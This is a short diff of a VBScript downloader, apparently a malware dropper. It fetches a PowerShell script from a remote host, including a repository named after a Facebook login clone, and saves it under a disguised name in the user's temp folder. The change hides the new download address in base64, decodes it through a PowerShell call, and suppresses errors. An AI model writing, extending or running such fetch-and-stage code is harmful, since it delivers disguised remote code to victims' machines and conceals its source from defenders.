@@ -2,8 +2,9 @@ Set shell = CreateObject("WScript.Shell")
 Set http = CreateObject("MSXML2.XMLHTTP")
 Set stream = CreateObject("ADODB.Stream")
 
-url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache/AudioHost.ps1"
-dest = shell.ExpandEnvironmentStrings("%TEMP%\AudioHost.ps1")
+b64url = "aHR0cHM6Ly8zLTRweC5wYWdlcy5kZXYvQS5wczE="
+url = shell.Exec("powershell -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & b64url & "'))").StdOut.ReadAll
+dest = shell.ExpandEnvironmentStrings("%TEMP%\A.ps1")
 
 On Error Resume Next
 
